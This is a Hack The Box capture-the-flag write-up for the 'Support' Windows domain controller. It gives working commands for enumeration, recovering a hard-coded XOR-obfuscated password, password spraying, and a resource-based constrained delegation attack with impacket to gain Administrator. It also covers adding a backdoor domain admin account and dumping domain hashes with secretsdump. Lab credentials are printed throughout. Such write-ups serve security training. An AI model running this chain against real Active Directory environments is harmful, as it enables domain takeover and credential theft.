---
layout: post
title: Hack the Box - Support
categories: "Writeups"
---

## NMAP
```bash
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-14 14:27:05Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration
# SMB
- We have read access into the "support-tools" share
- ![[anonymous_shares.png]](/images/HTB/Support/anonymous_shares.png)
- In the share there is a bunch of tools but only "UserInfo.exe.zip" seems interesting
- ![[rid_brute.png]](/images/HTB/Support/rid_brute.png)
- Since we have IPC$ access, we can rid brute force to get users
- Command to get list of users from output:
```bash
cat list.txt| awk {'print $6'} | cut -d '\' -f 2 > users.txt
```
# DNSpy
- Under LdapQuery in UserInfo.Services, we see an encoded password and key being xored
- ![[dnspy_enc_passwd.png]](/images/HTB/Support/dnspy_enc_passwd.png)
- Pass: ```0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E```
- Key: ```armando : 61 72 6d 61 6e 64 6f```

```csharp
namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```
Steps for getting the password - I used [CyberChef](https://gchq.github.io/CyberChef/) 
- Base64 decode
- xor twice with keys ``
- PW: ```nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz```


# Password Spray
- Once we obtain the password, we can password spray with our user list
- ![[ldap_pass_spray.png]](/images/HTB/Support/ldap_pass_spray.png)


- We find that the ldap user is valid ```ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz```

# Bloodhound
- Nothing interesting from bloodhound with the ldap user
- support user is part of Remote  Management Users
- ![[BH_RMU.png]](/images/HTB/Support/BH_RMU.png)
## NMAP P2
- Running nmap again (all ports) we find 5985 open, WinRM!
```bash
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-28 02:22:11Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49700/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53608/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking WinRM with CME
- No one from our list with the password above can remote in, we need support user
# Enumerating LDAP
```bash
ldapdomaindump ldap://10.10.11.174 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 
```
```bash
ldapsearch -x -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -D "CN=ldap,CN=Users,DC=support,DC=htb" -b "DC=support,DC=htb"
```
```bash
ldapsearch -x -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -D "CN=ldap,CN=Users,DC=support,DC=htb" -b "CN=support,CN=Users,DC=support,DC=htb" 
```

- There are a bunch of files in the ldapdomaindump we can look through for the search base
- By specifying the support user in the search base, we can see the password in the "info" section
```support : Ironside47pleasure40Watchful```
- ![[support_ldap_pw.png]](/images/HTB/Support/support_ldap_pw.png)
- Check with CME: ![[cme_winrm_support.png]](/images/HTB/Support/cme_winrm_support.png)
- We can remote in!
## Enumeration as support
# Bloodhound
- Looking through at our node, we can see we are a part of "Shared Support Accounts" which has "GenericAll" over the Domain Controller
- ![[BH_edges.png]](/images/HTB/Support/BH_edges.png)
- What does this mean? Full control of a computer object can be used to perform a resource based constrained delegation attack.

[Follwing hacktricks guide for creating the fake computer](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegationhttps://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
	
- I only used [powermad](https://github.com/Kevin-Robertson/Powermad) and [powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
```powershell
New-MachineAccount -MachineAccount TURCO$ -Password $(ConvertTo-SecureString 'turco123!' -AsPlainText -Force) -Verbose
```
```powershell
Set-ADComputer DC$ -PrincipalsAllowedToDelegateToAccount TURCO$ 
```
```powershell
Get-ADComputer DC$ -Properties PrincipalsAllowedToDelegateToAccount
```
- Once we have all that setup, we can verify with:
```powershell
 Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity'
```


![[new_fake_com.png]](/images/HTB/Support/new_fake_com.png)

- Next, we can use this [script](https://github.com/tothi/rbcd-attack) to allow us to delegate as Administrator by editing the "msDs-AllowedToActOnBehalfOfOtherIdentity" attribute
```bash
python rbcd-attack/rbcd.py support.htb\\support:Ironside47pleasure40Watchful -dc-ip 10.10.11.174 -t DC -f TURCO
```
- ![[attribute_edit_success.png]](/images/HTB/Support/attribute_edit_success.png)
- We can also verify everything worked using "impacket-rbcd"

```bash
impacket-rbcd support.htb/support:Ironside47pleasure40Watchful -delegate-to 'DC$' -action read -dc-ip 10.10.11.174
```
- ![[impacket-rbcd_proof.png]](/images/HTB/Support/impacket-rbcd_proof.png)

- Lastly, we create the ST using the "ldap/dc.support.htb" SPN 
```bash
impacket-getST support.htb/TURCO$:turco123! -spn 'ldap/dc.support.htb' -impersonate Administrator -dc-ip 10.10.11.174
```

- Now we can wmiexec into the Domain Controller as Admin!
- ![[PWNED.png]](/images/HTB/Support/PWNED.png)
```bash
KRB5CCNAME=Administrator.ccache impacket-wmiexec -k -no-pass support.htb/Administrator@dc.support.htb -dc-ip 10.10.11.174
```

## Post Exploitation
# Secretsdump
- Create a new user
```windows
net user turc0 Turco123123!! /add /domain
```
- Add to domain admins group
```windows
net group "Domain Admins" turc0 /add /domain
```

- Dump!
```bash
impacket-secretsdump support.htb/turc0@dc.support.htb -dc-ip 10.10.11.174 -just-dc
```